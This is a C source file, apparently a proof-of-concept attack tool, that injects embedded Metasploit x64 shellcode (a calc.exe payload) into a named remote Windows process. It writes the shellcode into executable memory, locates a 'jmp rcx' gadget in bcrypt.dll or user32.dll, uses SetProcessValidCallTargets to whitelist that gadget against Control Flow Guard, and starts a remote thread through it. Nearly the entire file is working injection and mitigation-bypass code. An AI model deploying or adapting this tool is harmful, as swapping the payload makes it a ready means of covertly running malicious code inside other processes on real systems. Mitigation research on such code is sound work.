/*
*
* Found a gadget in bcrypt.dll that can bypass CFG.
* Theoretically all processes which have bcrypt.dll
* can be targeted.
*
*/

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <memoryapi.h>
#include <Tlhelp32.h>
#include <Shlwapi.h>

// comment out to suppress output
//
#define _DBG

#ifdef _DBG
#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DEBUG_PRINT(x, ...)
#define _INT
#endif

// pick windows version
// lazy, didn't bother getting the version in code

// Win 1809
//\
#define _WIN_1809

// Win 1909
//\
#define _WIN_1909

// Win 21H1
//\
#define _WIN_21H1

// Win 22H2
//
#define _WIN_22H2

// Win 11
//\
#define _WIN_11_22H2

#ifdef _WIN_1809
#define ROP_RANGE 0x1000 * 100
#define ROP_DLL "bcrypt.dll"
#define ROP_BIT 0x3					// this is the last bit of the gadget's address
#endif

#ifdef _WIN_1909
#define ROP_RANGE 0x1000 * 100
#define ROP_DLL "bcryptprimitives.dll"
#define ROP_BIT 0x0
#endif

#ifdef _WIN_21H1
#define ROP_RANGE 0x1000 * 30
#define ROP_DLL "user32.dll"
#define ROP_BIT 0x0
#endif

#ifdef _WIN_22H2
#define ROP_RANGE 0x1000 * 30
#define ROP_DLL "user32.dll"
#define ROP_BIT 0x0
#endif

#ifdef _WIN_11_22H2
#define ROP_RANGE 0x1000 * 30
#define ROP_DLL "bcrypt.dll"
#define ROP_BIT 0x0
#endif

//x64 calc metasploit shellcode 
unsigned char payload[] = {
	0x90, 0x90, 0x90, 0x90, 0x90, 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00, 0x90
};

// get target process handle using snapshot method
BOOL GetRemoteProcHandle(_In_ LPWSTR szProcessName, _Out_ DWORD* dwProcId, _Out_ HANDLE* hProc)
{
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 stProc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (INVALID_HANDLE_VALUE == hSnapShot)
	{
		DEBUG_PRINT("[*]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	if (!Process32First(hSnapShot, &stProc))
	{
		DEBUG_PRINT("[-]Process32First failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	do
	{
		WCHAR lowerName[MAX_PATH * 2];

		if (stProc.szExeFile)
		{
			DWORD dwSize = lstrlenW(stProc.szExeFile);
			DWORD i = 0;

			RtlSecureZeroMemory(lowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2)
			{
				for (; i < dwSize; i++)
					lowerName[i] = (WCHAR)tolower(stProc.szExeFile[i]);

				lowerName[i++] = '\0';
			}
		}

		if (0 == wcscmp(lowerName, szProcessName))
		{
			*dwProcId = stProc.th32ProcessID;
			*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, stProc.th32ProcessID);
			if (NULL == *hProc)
				DEBUG_PRINT("[-]OpenProcess failed with error: 0x%.8x\n", GetLastError());
			break;
		}
	} while (Process32Next(hSnapShot, &stProc));

_endfunc:
	if (NULL != hSnapShot)
		CloseHandle(hSnapShot);
	if (NULL == *dwProcId || NULL == *hProc)
		return FALSE;

	return TRUE;
}

// inject shellcode into remote process
BOOL InjectRemoteProc(_In_ HANDLE hProc, _In_ PBYTE pShellcode, _In_ SIZE_T sShellcod, _Out_ PVOID* ppAddr)
{
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	*ppAddr = VirtualAllocEx(hProc, NULL, sShellcod, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (NULL == *ppAddr)
	{
		DEBUG_PRINT("[-]VirtualAllocEx failed with error: %d\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[+]Payload buffer address @ ==========> 0x%p\n", *ppAddr);

	DEBUG_PRINT("[*]Press <Enter> to write payload ..");
	_INT;

	if (!WriteProcessMemory(hProc, *ppAddr, pShellcode, sShellcod, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sShellcod)
	{
		DEBUG_PRINT("[-]WriteProcessMemory failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[*]Done ... %d bytes of payload written ...\n", sNumberOfBytesWritten);

	if (!VirtualProtectEx(hProc, *ppAddr, sShellcod, PAGE_EXECUTE_READWRITE, &dwOldProtection))
	{
		DEBUG_PRINT("[-]VirtualProtectEx failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

// perform thread hijacking
BOOL RopCfgFree(_In_ HANDLE hProc, _In_ PVOID pAddr, _In_ LPWSTR szProcessName)
{
	PVOID pLegitBase = NULL;
	PVOID rop = NULL;
	PVOID tmp = NULL;
	//PVOID lpParam = NULL;	// compile according to windows version
	PVOID hModBase = NULL;
	DWORD dwThrdId = 0x0;
	HANDLE hThrd = INVALID_HANDLE_VALUE;
	HMODULE hMods[1024] = { 0x0 };
	DWORD dwModSize = 0x0;
	DWORD cbNeeded = 0x0;

	// find a legit image to rop, get base address
	pLegitBase = (PVOID)LoadLibraryA(ROP_DLL);

	if (NULL == pLegitBase)
	{
		DEBUG_PRINT("[-]Failed to load image ...\n");
		return FALSE;
	}

	for (DWORD i = 0; i + 1 < ROP_RANGE && rop == NULL; i++)
	{
		if (((PCHAR)pLegitBase)[i] == '\xff' && ((PCHAR)pLegitBase)[i + 1] == '\xe1')
		{
			tmp = (PVOID)((PCHAR)pLegitBase + i);
			DEBUG_PRINT("[*]************: 0x%p\n", tmp);
			DEBUG_PRINT("[*]************: %x\n", (ULONG_PTR)tmp & 0xF);
		}
		DWORD delta = (ULONG_PTR)tmp & 0xF;
		if (delta == ROP_BIT)
			rop = tmp;
		else
			continue;
	}

	if (NULL == rop)
	{
		DEBUG_PRINT("[-]Cannot find rop gadget ...\n");
		return FALSE;
	}

	DEBUG_PRINT("[+]ROP jmp rcx found @ ===========> 0x%p\n", rop);

	DEBUG_PRINT("[*]Press <Enter> to disable CFG on gadget ...");
	_INT;

	FARPROC SetProcessValidCallTargets = GetProcAddress(GetModuleHandleW(L"kernelbase.dll"), "SetProcessValidCallTargets");
	if (NULL == SetProcessValidCallTargets)
	{
		DEBUG_PRINT("[-]Faile to revolve SetProcessValidCallTargets function ...\n");
		return FALSE;
	}

	MEMORY_BASIC_INFORMATION mbi = { 0x0 };

	VirtualQuery(rop, &mbi, sizeof(mbi));

	DEBUG_PRINT("[*]DLL allocation base @ =========> 0x%p\n", mbi.AllocationBase);
	DEBUG_PRINT("[*]DLL region size %d\n", mbi.RegionSize);

	CFG_CALL_TARGET_INFO callTargets[1] = { 0x0 };

	callTargets[0].Flags = CFG_CALL_TARGET_VALID;
    // offset must be aligned
	callTargets[0].Offset = (ULONG_PTR)(rop) & 0xFFFFFFFFFFFFFFF0 - (ULONG_PTR)(mbi.AllocationBase);

	DEBUG_PRINT("[*]rop & 0xFFFFFFFFFFFFFFF0: 0x%x\n", (ULONG_PTR)rop & 0xFFFFFFFFFFFFFFF0);
	DEBUG_PRINT("[*]offset: 0x%x\n", ((ULONG_PTR)(rop) & 0xFFFFFFFFFFFFFFF0) - (ULONG_PTR)(mbi.AllocationBase));

	if (!SetProcessValidCallTargets(
		hProc,
		mbi.AllocationBase,         // gadget DLL base address
		mbi.RegionSize,             // gadget DLL size
		0x1,                        // only one address to free from CFG
		&callTargets))
	{
		DEBUG_PRINT("[-]Failed to call SetProcessValidCallTargets : 0x%.8x\n", GetLastError());
	}

	DEBUG_PRINT("[*]Done ...\n");

	DEBUG_PRINT("[*]Press <Enter> to create thread ...");
	_INT;

	if (NULL == (hThrd = CreateRemoteThread(
		hProc,
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)((PVOID)((ULONG_PTR)rop & 0xFFFFFFFFFFFFFFF0)),     // start with the aligned address
		pAddr,
		NULL,
		&dwThrdId)))
	{
		DEBUG_PRINT("[-]Create thread fialed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[*]Thread created with ID: %d\n", dwThrdId);

	DEBUG_PRINT("[*]Check ...");
	_INT;

	return TRUE;
}

int wmain(int argc, wchar_t** argv)
{
	HANDLE hProc = NULL;
	DWORD dwProcId = NULL;
	PVOID pAddr = NULL;

	if (argc < 2)
	{
		DEBUG_PRINT("[-]Usage: \"%ws\" <Process Name> \n", argv[0]);
		return -1;
	}

	DEBUG_PRINT("[*]Trageting process: \"%ws\" ...\n", argv[1]);

	if (!GetRemoteProcHandle(argv[1], &dwProcId, &hProc))
	{
		DEBUG_PRINT("[-]Process not found ...\n");
		return -1;
	}

	DEBUG_PRINT("[+]Found target process @ ==========> %d\n", dwProcId);

	DEBUG_PRINT("[*]Inject shellcode ...\n");

	if (!InjectRemoteProc(hProc, payload, sizeof(payload), &pAddr))
	{
		DEBUG_PRINT("[-]Inject shellcode failed ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]RopCfgFree execute ... \n");

	if (!RopCfgFree(hProc, pAddr, argv[1]))
	{
		DEBUG_PRINT("[-]RopCfgFree execute failed ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]DONE ...\n");

	CloseHandle(hProc);

	DEBUG_PRINT("[*]Press <Enter> to quit ...");
	_INT;

	return 0;
}

